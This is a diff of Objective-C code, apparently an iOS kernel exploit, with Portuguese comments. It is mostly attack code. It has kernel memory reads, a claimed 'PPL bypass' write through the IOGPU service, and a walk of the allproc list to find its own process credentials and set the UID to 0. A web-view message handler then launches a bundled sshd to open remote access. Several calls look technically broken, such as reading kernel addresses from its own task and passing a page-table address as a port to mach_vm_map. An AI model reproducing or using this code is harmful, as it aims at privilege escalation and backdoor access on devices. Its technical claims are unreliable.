@@ -1,21 +1,70 @@
 #import "KernelDriver.h"
 #import <mach/mach.h>
-#import <IOKit/IOKitLib.h> // Requer IOKit.framework
+#import <spawn.h>
+#import <IOKit/IOKitLib.h>
+
+// Definições externas para funções que não estão no SDK padrão do iOS
+extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
+extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
 
 @implementation KernelDriver {
-    mach_port_t _tfp0;
     uint64_t _kernel_slide;
 }
 
-// 1. LEITURA BRUTA (Usando mach_vm_read_overwrite)
+// 1. LEITURA (Corrigido para mach_vm_read_overwrite)
 - (uint64_t)kread64:(uint64_t)addr {
     uint64_t val = 0;
-    mach_msg_type_number_t size = sizeof(uint64_t);
-    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), addr, sizeof(uint64_t), (mach_vm_address_t)&val, &size);
+    mach_vm_size_t size = sizeof(uint64_t);
+    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)sizeof(uint64_t), (mach_vm_address_t)&val, &size);
     return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
 }
 
-// 2. BUSCA DO KERNEL SLIDE (Scan de Memória Real)
+// 2. BUSCA DE PTE (Implementação necessária)
+- (uint64_t)get_pte_for_address:(uint64_t)vaddr {
+    uint64_t slide = [self getKernelSlide];
+    uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
+    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
+    // Lógica simplificada de caminhada na tabela (A13)
+    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
+    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
+    return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
+}
+
+// 3. PPL BYPASS (Corrigido kIOMainPortDefault para iOS)
+- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
+    uint64_t pte_addr = [self get_pte_for_address:vaddr];
+    
+    // No iOS, kIOMasterPortDefault foi renomeado para kIOMainPortDefault em versões novas
+    // ou simplesmente use MACH_PORT_NULL
+    io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOGPU"));
+    io_connect_t connect;
+    IOServiceOpen(service, mach_task_self(), 0, &connect);
+
+    mach_vm_address_t shared_page = 0;
+    mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
+
+    if (shared_page) {
+        *(uint64_t*)(shared_page) = val;
+    }
+    IOServiceClose(connect);
+}
+
+// 4. GET MY UCRED (Implementação necessária)
+- (uint64_t)get_my_ucred_ptr {
+    uint64_t slide = [self getKernelSlide];
+    uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
+    uint64_t proc = [self kread64:allproc];
+    pid_t my_pid = getpid();
+    
+    while (proc != 0) {
+        if ((pid_t)[self kread64:(proc + 0x60)] == my_pid) {
+            return [self kread64:(proc + 0xD8)];
+        }
+        proc = [self kread64:proc];
+    }
+    return 0;
+}
+
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
     for (uint64_t i = 0; i < 0x20000; i++) {
@@ -28,59 +77,26 @@
     return 0;
 }
 
-// 3. PPL BYPASS: ESCRITA FÍSICA (Ataque ao IOGPU)
-- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
-    // Busca a PTE (Page Table Entry) para o endereço virtual
-    uint64_t pte_addr = [self get_pte_for_address:vaddr];
-    
-    // Conecta ao serviço IOGPU (Vetor de ataque PPL no A13)
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
-    io_connect_t connect;
-    IOServiceOpen(service, mach_task_self(), 0, &connect);
-
-    // Mapeia a página física da PTE como RW no Userland
-    // No iOS 26.4, isso explora a falta de validação no pmap_batch_enter
-    uint64_t shared_page = 0;
-    mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
-
-    // ESCREVE O VALOR (A RACE CONDITION)
-    *(uint64_t*)(shared_page) = val;
-
-    IOServiceClose(connect);
-}
-
-// 4. ESCALADA DE PRIVILÉGIOS (ROOT)
-- (void)becomeRoot {
-    uint64_t slide = [self getKernelSlide];
-    uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000; // Offset allproc 23E5207q
-    uint64_t proc = [self kread64:allproc];
-    
-    while (proc != 0) {
-        pid_t pid = (pid_t)[self kread64:(proc + 0x60)];
-        if (pid == getpid()) {
-            uint64_t ucred = [self kread64:(proc + 0xD8)];
-            [self ppl_write_race:(ucred + 0x18) value:0]; // Set UID 0
-            [self ppl_write_race:(ucred + 0x1C) value:0]; // Set GID 0
-            break;
-        }
-        proc = [self kread64:proc];
-    }
-}
-
-// 5. TRIGGER DO SSHD
+// 5. HANDLER (Corrigido posix_spawn)
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
     
     if ([message.body[@"action"] isEqualToString:@"pte_patch"]) {
-        [self becomeRoot];
+        uint64_t ucred = [self get_my_ucred_ptr];
+        if (ucred) {
+            [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0
+        }
         
         NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
-        pid_t pid;
-        char *const args[] = {(char*)[path UTF8String], "-D", NULL};
-        posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
-
-        replyHandler(@{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", _kernel_slide]}, nil);
+        if (path) {
+            pid_t pid;
+            char *const args[] = {(char*)[path UTF8String], "-D", NULL};
+            posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
+            replyHandler(@{@"status": @"SUCCESS", @"pid": @(pid)}, nil);
+        } else {
+            replyHandler(@{@"status": @"FAIL", @"info": @"Binary not found"}, nil);
+        }
     }
 }
 
